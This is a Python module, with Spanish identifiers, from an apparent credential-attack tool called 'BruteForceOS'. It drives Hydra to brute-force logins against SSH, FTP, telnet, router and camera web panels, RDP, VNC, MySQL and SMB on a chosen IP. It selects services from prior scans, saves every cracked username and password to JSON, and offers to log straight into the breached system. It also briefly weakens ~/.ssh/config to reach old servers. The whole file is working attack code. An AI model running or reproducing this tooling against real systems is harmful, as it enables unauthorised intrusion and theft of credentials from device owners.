import json
import re
import shutil
import subprocess
from contextlib import contextmanager
from datetime import datetime
from pathlib import Path

from conexion import _asegurar_herramienta, lanzar_conexion
from validacion import es_ip_valida
from ui import (
    cabecera_seccion,
    ejecutar_con_spinner,
    imprimir_menu,
    limpiar,
    msg_aviso,
    msg_error,
    msg_info,
    msg_nota,
    msg_ok,
    pausar,
    verde,
)

BASE_DIR = Path(__file__).resolve().parent
CARPETA_DICCIONARIOS = BASE_DIR / "diccionarios"
CARPETA_RESULTADOS = BASE_DIR / "resultados"
CARPETA_ESCANEO = CARPETA_RESULTADOS / "escaneos"
ARCHIVO_DISPOSITIVOS = CARPETA_RESULTADOS / "dispositivos_accedidos.json"

SERVICIOS_SOPORTADOS = {
    "ssh", "ftp", "telnet",
    "http-get", "http-form-post", "https-get", "https-form-post",
    "rdp", "vnc", "mysql", "smb",
}
HILOS_POR_DEFECTO = 4

# Puerto por defecto para cada servicio soportado por hydra
PUERTOS_SERVICIO = {
    "ssh": 22,
    "ftp": 21,
    "telnet": 23,
    "http-get": 80,
    "http-form-post": 80,
    "https-get": 443,
    "https-form-post": 443,
    "rdp": 3389,
    "vnc": 5900,
    "mysql": 3306,
    "smb": 445,
}

# Servicios web que requieren una opción de módulo extra (ruta / formulario)
SERVICIOS_WEB = {"http-get", "http-form-post", "https-get", "https-form-post"}


def _cargar_json(ruta: Path, defecto):
    if not ruta.exists():
        return defecto
    try:
        with open(ruta, "r", encoding="utf-8") as f:
            return json.load(f)
    except (json.JSONDecodeError, OSError):
        return defecto


def _guardar_json(ruta: Path, datos) -> None:
    ruta.parent.mkdir(parents=True, exist_ok=True)
    with open(ruta, "w", encoding="utf-8") as f:
        json.dump(datos, f, indent=2, ensure_ascii=False)


def _normalizar_servicio(servicio: str, puerto: int) -> str | None:
    s = (servicio or "").lower()
    if "ssh" in s or puerto == 22:
        return "ssh"
    if "ftp" in s or puerto == 21:
        return "ftp"
    if "telnet" in s or puerto == 23:
        return "telnet"
    # Paneles web (cámaras, routers, NVR...): autenticación básica HTTP(S)
    if "https" in s or puerto in (443, 8443):
        return "https-get"
    if "http" in s or puerto in (80, 8080, 8000, 81):
        return "http-get"
    if "ms-wbt-server" in s or "rdp" in s or puerto == 3389:
        return "rdp"
    if "vnc" in s or puerto in (5900, 5901):
        return "vnc"
    if "mysql" in s or puerto == 3306:
        return "mysql"
    if "microsoft-ds" in s or "netbios" in s or "smb" in s or puerto in (445, 139):
        return "smb"
    return None


def _puerto_valido(puerto: int) -> bool:
    return 1 <= puerto <= 65535


@contextmanager
def _ssh_config_legado(ip: str):
    ssh_dir = Path.home() / ".ssh"
    ssh_dir.mkdir(mode=0o700, parents=True, exist_ok=True)
    cfg_path = ssh_dir / "config"
    original = cfg_path.read_text(encoding="utf-8") if cfg_path.exists() else None

    bloque_legado = (
        f"\n# BruteForceOS compat SSH antiguo\n"
        f"Host {ip}\n"
        f"    MACs +hmac-sha1,hmac-md5,umac-64@openssh.com\n"
        f"    KexAlgorithms +diffie-hellman-group14-sha1,diffie-hellman-group1-sha1\n"
        f"    HostKeyAlgorithms +ssh-rsa\n"
        f"    PubkeyAcceptedKeyTypes +ssh-rsa\n"
    )
    cfg_path.write_text((original or "") + bloque_legado, encoding="utf-8")
    try:
        yield
    finally:
        if original is None:
            cfg_path.unlink(missing_ok=True)
        else:
            cfg_path.write_text(original, encoding="utf-8")


def _limpiar_hydra_restore() -> None:
    for ruta in (Path.cwd() / "hydra.restore", BASE_DIR / "hydra.restore"):
        ruta.unlink(missing_ok=True)


def _elegir_diccionario_usuarios(diccionario_passwords: str) -> str | None:
    archivos = sorted([p for p in CARPETA_DICCIONARIOS.iterdir() if p.is_file()]) if CARPETA_DICCIONARIOS.exists() else []
    imprimir_menu(
        "Diccionario de Usuarios",
        [
            ("1", f"Usar el mismo diccionario ({Path(diccionario_passwords).name})"),
            ("2", "Elegir otro diccionario de la carpeta diccionarios/"),
            ("3", "Escribir una ruta manual"),
        ],
    )

    sel = input(verde("Elige opción [1]: ")).strip() or "1"
    if sel == "1":
        return diccionario_passwords
    if sel == "2":
        if not archivos:
            msg_aviso("No hay diccionarios en la carpeta diccionarios/.")
            pausar()
            return None
        for idx, a in enumerate(archivos, start=1):
            print(f"  [{idx}] {a.name}")
        num = input(verde("Número de diccionario de usuarios: ")).strip()
        if num.isdigit() and 1 <= int(num) <= len(archivos):
            return str(archivos[int(num) - 1])
        msg_aviso("Selección no válida.")
        pausar()
        return None
    if sel == "3":
        ruta = input(verde("Ruta del archivo de usuarios: ")).strip()
        if ruta and Path(ruta).exists():
            return ruta
        msg_error("La ruta indicada no existe.")
        pausar()
        return None

    msg_aviso("Opción no válida.")
    pausar()
    return None


def _opcion_modulo_para(servicio: str, interactivo: bool = True) -> str | None:
    """Devuelve el argumento extra que hydra necesita para los módulos web.

    - http-get / https-get: la ruta a proteger (por defecto "/").
    - http-form-post / https-form-post: la cadena del formulario de login.
    """
    if servicio not in SERVICIOS_WEB:
        return None

    if servicio in ("http-get", "https-get"):
        if not interactivo:
            return "/"
        ruta = input(verde("Ruta protegida del panel [/]: ")).strip() or "/"
        if not ruta.startswith("/"):
            ruta = "/" + ruta
        return ruta

    # Formularios (login web de cámara/router)
    if not interactivo:
        return None
    msg_nota("Formato hydra: /ruta:campo_user=^USER^&campo_pass=^PASS^:F=texto_de_error")
    msg_nota("Ejemplo: /login.cgi:user=^USER^&pwd=^PASS^:F=incorrect")
    forma = input(verde("Cadena del formulario: ")).strip()
    return forma or None


def registrar_acceso_exitoso(ip: str, servicio: str, puerto: int, usuario: str, password: str, so_dispositivo: str = "No detectado") -> None:
    ruta_escaneo = CARPETA_ESCANEO / f"{ip}.json"
    datos_ip = _cargar_json(ruta_escaneo, {
        "ip": ip,
        "actualizado": datetime.now().isoformat(timespec="seconds"),
        "so_dispositivo": so_dispositivo,
        "puertos": [],
        "credenciales": [],
    })

    if so_dispositivo != "No detectado":
        datos_ip["so_dispositivo"] = so_dispositivo

    cred = {
        "servicio": servicio,
        "puerto": int(puerto),
        "usuario": usuario,
        "password": password,
        "fecha": datetime.now().isoformat(timespec="seconds"),
    }

    creds_existentes = datos_ip.get("credenciales", [])
    duplicado = any(
        c.get("servicio") == servicio
        and int(c.get("puerto", 0)) == int(puerto)
        and c.get("usuario") == usuario
        and c.get("password") == password
        for c in creds_existentes
    )
    if not duplicado:
        creds_existentes.append(cred)
    datos_ip["credenciales"] = creds_existentes
    datos_ip["actualizado"] = datetime.now().isoformat(timespec="seconds")
    _guardar_json(ruta_escaneo, datos_ip)

    dispositivos = _cargar_json(ARCHIVO_DISPOSITIVOS, [])
    so_final = datos_ip.get("so_dispositivo", so_dispositivo)
    idx_existente = next(
        (i for i, d in enumerate(dispositivos) if d.get("ip") == ip and d.get("servicio") == servicio and int(d.get("puerto", 0)) == int(puerto)),
        None,
    )
    registro_disp = {
        "ip": ip,
        "servicio": servicio,
        "puerto": int(puerto),
        "usuario": usuario,
        "password": password,
        "so_dispositivo": so_final,
        "actualizado": datetime.now().isoformat(timespec="seconds"),
    }
    if idx_existente is not None:
        dispositivos[idx_existente] = registro_disp
    else:
        dispositivos.append(registro_disp)
    _guardar_json(ARCHIVO_DISPOSITIVOS, dispositivos)


def _extraer_credenciales_hydra(salida: str) -> list[tuple[str, str]]:
    hallazgos = []
    for linea in salida.splitlines():
        m = re.search(r"\[\d+\]\[\S+\]\s+host:\s+\S+.*?\blogin:\s+(\S+)\s+password:\s+(.*)$", linea)
        if m:
            usuario = m.group(1).strip()
            password = m.group(2).strip()
            if (usuario, password) not in hallazgos:
                hallazgos.append((usuario, password))
    return hallazgos


def ejecutar_hydra(
    ip: str,
    servicio: str,
    puerto: int,
    diccionario_passwords: str,
    usuario: str | None = None,
    lista_usuarios: str | None = None,
    hilos: int = HILOS_POR_DEFECTO,
    opcion_modulo: str | None = None,
) -> list[tuple[str, str]]:
    if not shutil.which("hydra") and not _asegurar_herramienta("hydra", "hydra"):
        pausar()
        return []

    if not _puerto_valido(int(puerto)):
        msg_error(f"Puerto fuera de rango (1-65535): {puerto}")
        pausar()
        return []

    base_cmd = ["hydra", "-I", "-t", str(hilos), "-s", str(puerto)]
    if usuario:
        base_cmd.extend(["-l", usuario])
    elif lista_usuarios:
        base_cmd.extend(["-L", lista_usuarios])
    else:
        msg_aviso("Debes indicar un usuario o una lista de usuarios.")
        pausar()
        return []

    # Los modulos web de hydra reciben un argumento extra tras el servicio:
    #   http-get       -> la ruta, ej. "/"
    #   http-form-post -> "/login:user=^USER^&pass=^PASS^:F=texto_de_fallo"
    cola = [ip, servicio]
    if opcion_modulo:
        cola.append(opcion_modulo)

    cmd = base_cmd + ["-P", diccionario_passwords] + cola
    msg_info(f"Lanzando Hydra contra {ip}:{puerto} ({servicio})...")
    print("-" * 62)

    try:
        res = ejecutar_con_spinner(cmd, texto=f"Probando credenciales ({servicio})")
        salida = (res.stdout or "") + (res.stderr or "")
        print(salida)

        # Si es SSH y hay choque de algoritmos/MAC con un servidor antiguo, reintenta usando ~/.ssh/config temporal
        if servicio == "ssh" and any(
            clave in salida.lower()
            for clave in ("no match for method", "kex error", "mac algo", "cipher", "host key")
        ):
            msg_nota("Servidor SSH antiguo detectado. Reintentando con compatibilidad de algoritmos...")
            with _ssh_config_legado(ip):
                res_legado = ejecutar_con_spinner(cmd, texto="Reintentando (compatibilidad SSH)")
            salida_legado = (res_legado.stdout or "") + (res_legado.stderr or "")
            print(salida_legado)
            salida += "\n" + salida_legado
    finally:
        _limpiar_hydra_restore()

    hallazgos = _extraer_credenciales_hydra(salida)
    datos_ip = _cargar_json(CARPETA_ESCANEO / f"{ip}.json", {})
    so_disp = datos_ip.get("so_dispositivo", "No detectado")

    for u, p in hallazgos:
        msg_ok(f"Acceso válido en {ip}:{puerto} ({servicio}) -> usuario: '{u}' | contraseña: '{p}'")
        registrar_acceso_exitoso(ip, servicio, puerto, u, p, so_disp)

    if hallazgos:
        u_primero, p_primero = hallazgos[0]
        conectar_ahora = input(verde("\n¿Conectarte al sistema ahora mismo? [S/n]: ")).strip().lower()
        if conectar_ahora in ("", "s", "si", "sí", "y", "yes"):
            lanzar_conexion({
                "ip": ip,
                "servicio": servicio,
                "puerto": int(puerto),
                "usuario": u_primero,
                "password": p_primero,
                "so_dispositivo": so_disp,
            })
        else:
            pausar()
    else:
        msg_aviso("No se encontraron credenciales válidas con los diccionarios indicados.")
        pausar()

    return hallazgos


def menu_ataque(objetivo_actual: str | None = None, diccionario_actual: str | None = None) -> str | None:
    while True:
        limpiar()
        cabecera_seccion("Pruebas de Acceso y Credenciales", f"Objetivo: {objetivo_actual or 'Sin definir'}")

        ip = input(verde(f"IP objetivo [{objetivo_actual or ''}]: ")).strip() or (objetivo_actual or "")
        if not ip:
            msg_aviso("No hay IP objetivo definida.")
            pausar()
            return objetivo_actual
        if not es_ip_valida(ip):
            msg_error(f"'{ip}' no es una dirección IP válida.")
            pausar()
            return objetivo_actual

        dic = input(verde(f"Ruta del diccionario [{diccionario_actual or ''}]: ")).strip() or (diccionario_actual or "")
        if not dic or not Path(dic).exists():
            msg_error("Debes seleccionar o indicar un diccionario válido.")
            pausar()
            return objetivo_actual

        datos_ip = _cargar_json(CARPETA_ESCANEO / f"{ip}.json", {})
        puertos_detectados = datos_ip.get("puertos", [])
        objetivos_ataque = []

        for p in puertos_detectados:
            srv = _normalizar_servicio(p.get("servicio", ""), int(p.get("puerto", 0)))
            if srv in SERVICIOS_SOPORTADOS:
                objetivos_ataque.append((srv, int(p["puerto"])))

        txt_auto = (
            f"Automático según escaneo previo ({', '.join(f'{s}:{pt}' for s, pt in objetivos_ataque)})"
            if objetivos_ataque
            else "Automático según escaneo previo (sin puertos guardados; pasará a manual)"
        )

        imprimir_menu(
            "Modo de Ataque",
            [
                ("1", txt_auto),
                ("2", "Elegir servicio y puerto manualmente"),
                ("0", "Volver al menú principal"),
            ],
        )

        op = input(verde("Elige opción: ")).strip()
        if op == "0":
            return ip

        imprimir_menu(
            "Objetivo de Usuario",
            [
                ("1", "Conozco el usuario (indicar uno concreto)"),
                ("2", "No conozco el usuario (usar diccionario de usuarios)"),
            ],
        )
        modo_user = input(verde("Elige opción [1]: ")).strip() or "1"

        usuario = None
        lista_usuarios = None
        if modo_user == "2":
            lista_usuarios = _elegir_diccionario_usuarios(dic)
            if not lista_usuarios:
                continue
        else:
            usuario = input(verde("Usuario objetivo [msfadmin]: ")).strip() or "msfadmin"

        if op == "1" and objetivos_ataque:
            for srv, pt in objetivos_ataque:
                opcion = _opcion_modulo_para(srv, interactivo=False)
                ejecutar_hydra(ip, srv, pt, dic, usuario=usuario, lista_usuarios=lista_usuarios, opcion_modulo=opcion)
        else:
            if op == "1" and not objetivos_ataque:
                msg_nota("No había puertos guardados del escaneo; indícalo aquí:")
            msg_nota("Servicios: ssh ftp telnet http-get http-form-post https-get rdp vnc mysql smb")
            srv = input(verde("Servicio [ssh]: ")).strip().lower() or "ssh"
            if srv not in SERVICIOS_SOPORTADOS:
                msg_aviso(f"Servicio '{srv}' no soportado. Usando 'ssh'.")
                srv = "ssh"
            puerto_def = PUERTOS_SERVICIO.get(srv, 22)
            pt_txt = input(verde(f"Puerto [{puerto_def}]: ")).strip() or str(puerto_def)
            puerto = int(pt_txt) if pt_txt.isdigit() else puerto_def
            if not _puerto_valido(puerto):
                msg_error(f"Puerto fuera de rango (1-65535): {puerto}")
                pausar()
                return ip
            opcion = _opcion_modulo_para(srv, interactivo=True)
            ejecutar_hydra(ip, srv, puerto, dic, usuario=usuario, lista_usuarios=lista_usuarios, opcion_modulo=opcion)

        return ip